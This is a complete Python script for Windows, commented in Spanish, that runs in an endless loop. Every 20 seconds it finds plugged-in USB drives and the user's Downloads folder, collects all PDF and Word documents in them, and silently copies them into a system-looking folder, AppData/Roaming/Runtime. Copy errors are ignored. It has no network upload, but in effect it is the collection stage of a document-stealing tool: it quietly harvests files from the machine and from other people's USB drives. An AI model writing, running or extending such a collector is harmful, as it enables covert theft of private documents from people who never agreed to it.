import os # Obtener nombre de usuario y rutas del sistema
import time # Controlar intervalos de espera entre escaneos
import pathlib # Manejo moderno de rutas de archivos y directorios
import getpass # Obtener nombre de usuario de forma portable
import ctypes # Acceder a funciones del sistema para identificar tipo de unidad
import shutil # Copiar archivos entre rutas

# VARIABLES GLOBALES
extensiones_documentos = ['pdf', 'doc', 'docx'] # Extensiones de documentos a detectar
intervalo_escaneo = 20 # Segundos entre cada escaneo
nombre_usuario = getpass.getuser() # Nombre del usuario actual del sistema
directorio_guardado = pathlib.Path(f"C:/Users/{nombre_usuario}/AppData/Roaming/Runtime") # Carpeta destino de copias

# FUNCIONES
# Determina si una unidad es extraíble (USB) usando la API de Windows
def es_unidad_extraible(letra_unidad):
    tipo_unidad = ctypes.windll.kernel32.GetDriveTypeW(f"{letra_unidad}:\\")
    
    # Tipo 2 corresponde a unidad extraíble (USB)
    return tipo_unidad == 2

# Busca dispositivos USB conectados filtrando solo unidades extraíbles
def obtener_unidades_usb():
    unidades_usb = [] # Lista para almacenar rutas de unidades USB
    
    # Recorrer letras de unidades posibles de la A a la Z
    for letra_unidad in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        ruta_unidad = f"{letra_unidad}:/"
        
        # Verificar si la unidad existe y es extraíble
        if os.path.exists(ruta_unidad):
            if es_unidad_extraible(letra_unidad):
                unidades_usb.append(pathlib.Path(ruta_unidad))
    
    return unidades_usb

# Determina la carpeta de descargas existente (Downloads o Descargas)
def obtener_carpeta_descargas():
    ruta_downloads = pathlib.Path(f"C:/Users/{nombre_usuario}/Downloads") # Ruta en inglés
    ruta_descargas = pathlib.Path(f"C:/Users/{nombre_usuario}/Descargas") # Ruta en español
    
    # Priorizar Downloads si existe
    if ruta_downloads.exists() and ruta_downloads.is_dir():
        return ruta_downloads
    
    # Usar Descargas si Downloads no existe
    if ruta_descargas.exists() and ruta_descargas.is_dir():
        return ruta_descargas
    
    return None

# Busca documentos con extensiones válidas dentro de una ruta dada
def buscar_documentos(ruta_busqueda):
    documentos_encontrados = [] # Lista para almacenar rutas de documentos
    
    # Verificar que la ruta exista y sea directorio
    if not ruta_busqueda.exists() or not ruta_busqueda.is_dir():
        return documentos_encontrados
    
    # Buscar cada extensión de documento en la ruta
    for extension_val in extensiones_documentos:
        for archivo_iter in ruta_busqueda.rglob(f'*.{extension_val}'):
            if archivo_iter.is_file():
                documentos_encontrados.append(archivo_iter)
    
    return documentos_encontrados

# Copia un documento al directorio de guardado evitando sobreescribir existentes
def copiar_documento(ruta_origen):
    # Crear directorio de guardado si no existe
    if not directorio_guardado.exists():
        directorio_guardado.mkdir(parents = True, exist_ok = True)
    
    # Construir ruta destino con el mismo nombre del archivo
    ruta_destino = directorio_guardado / ruta_origen.name
    
    # Verificar si el archivo ya existe en destino
    if ruta_destino.exists():
        return None # Omitir copia si el archivo ya está guardado
    
    # Copiar archivo preservando metadatos
    try:
        shutil.copy2(ruta_origen, ruta_destino)
        return ruta_destino
    except Exception as e:
        return None # Ignorar errores de copia (permisos, archivos bloqueados)

# Escanea USB y carpeta de descargas copiando documentos encontrados
def escanear_dispositivos():
    documentos_totales = [] # Lista para acumular documentos de todas las fuentes
    
    # Escanear unidades USB conectadas
    unidades_usb = obtener_unidades_usb()
    
    # Buscar documentos en cada unidad USB detectada
    for unidad_iter in unidades_usb:
        documentos_usb = buscar_documentos(unidad_iter)
        documentos_totales.extend(documentos_usb)
    
    # Buscar carpeta de descargas existente
    carpeta_descargas = obtener_carpeta_descargas()
    
    # Buscar documentos en carpeta de descargas si existe
    if carpeta_descargas:
        documentos_descargas = buscar_documentos(carpeta_descargas)
        documentos_totales.extend(documentos_descargas)
    
    # Copiar cada documento encontrado al directorio de guardado
    copias_realizadas = [] # Lista para almacenar copias exitosas
    
    for doc_iter in documentos_totales:
        ruta_copia = copiar_documento(doc_iter)
        
        if ruta_copia is not None:
            copias_realizadas.append(ruta_copia)
    
    # Mostrar copias realizadas en pantalla
    if copias_realizadas:
        # Mostrar separador visual para inicio de resultados
        print("-" * 36)
        
        # Mostrar cada copia realizada con numeración
        for indice_doc, doc_iter in enumerate(copias_realizadas, 1):
            print(f"{indice_doc}. {doc_iter}")
        
        # Mostrar separador final
        print("-" * 36 + "\n")
    else:
        print("No new documents found\n")

# PUNTO DE PARTIDA
# Bucle principal del programa
while True:
    # Ejecutar escaneo de dispositivos y copia de documentos
    escanear_dispositivos()
    
    # Esperar intervalo definido antes del siguiente escaneo
    time.sleep(intervalo_escaneo)